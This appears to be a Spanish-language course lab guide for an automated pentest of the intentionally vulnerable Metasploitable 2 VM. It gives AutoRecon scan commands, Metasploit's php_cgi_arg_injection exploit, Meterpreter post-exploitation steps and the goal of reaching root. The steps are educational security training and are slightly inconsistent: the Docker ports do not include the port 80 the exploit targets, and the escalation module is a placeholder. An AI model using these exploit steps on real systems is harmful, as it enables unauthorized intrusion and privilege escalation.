# Lab 5: Pentesting Autónomo con AutoRecon y Metasploit

## Objetivo

Ejecutar un pentest automatizado en Metasploitable 2, documentando el proceso completo.

## Prerrequisitos

- Docker o VM con Metasploitable 2
- Kali Linux con AutoRecon y Metasploit

## Entorno

```bash
# Levantar Metasploitable 2
docker run -d -p 2222:22 -p 3306:3306 --name metasploitable2 tleemcjr/metasploitable2

# IP objetivo
export TARGET=192.168.56.5
```

## Escenario

Ejecuta un pentest automatizado completo en Metasploitable 2, desde reconocimiento hasta explotación.

## Pasos

### Paso 1: AutoRecon

```bash
# Escaneo automatizado
python3 autorecon.py $TARGET -vv

# Revisar resultados en ./results/
ls -la results/
```

### Paso 2: Metasploit

```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
search type:exploit platform:linux target:unix

# Usar exploit
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS $TARGET
set RPORT 80
run
```

### Paso 3: Post-Explotación

```bash
# En Meterpreter
sysinfo
getuid
shell

# Escalamiento
background
use post/linux/...
```

## Entregable

**Archivo**: `pentest_autonomo.md`

Incluir:
- Resultados de AutoRecon
- Exploit utilizado
- Shell obtenida
- Hallazgos priorizados

## Resultado Esperado

Al completar el lab, el estudiante debe haber ejecutado el ciclo completo de pentest automatizado:

1. **AutoRecon completado**: Directorio `results/$TARGET/` generado con subdirectorios por servicio (ej. `tcp80/`, `tcp22/`) y al menos 5 servicios identificados con versiones.
2. **Sesión Meterpreter activa**: Output en terminal mostrando el prompt `meterpreter >` con el resultado de `sysinfo` confirmando acceso al objetivo (`OS: Linux metasploitable`).
3. **Usuario root obtenido**: Output de `getuid` mostrando `Server username: root` o equivalente con privilegios elevados.
4. **Encadenamiento documentado**: Al menos 2 vulnerabilidades distintas explotadas en secuencia (ej. `php_cgi_arg_injection` → escalamiento local).

**Evidencia mínima aceptable**:
- Captura del prompt Meterpreter con `sysinfo` y `getuid`.
- Listado de `ls results/` mostrando la estructura de AutoRecon.

## Recursos

- [AutoRecon GitHub](https://github.com/Tib3rius/AutoRecon)
- [Metasploit Unleashed (Offensive Security)](https://www.offensive-security.com/metasploit-unleashed/)
- [Metasploitable 2 Exploitability Guide](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)
- [MITRE ATT&CK: T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [VulnHub: Metasploitable2](https://www.vulnhub.com/entry/metasploitable-2,29/)
- [HackTricks: Pentesting Methodology](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology)
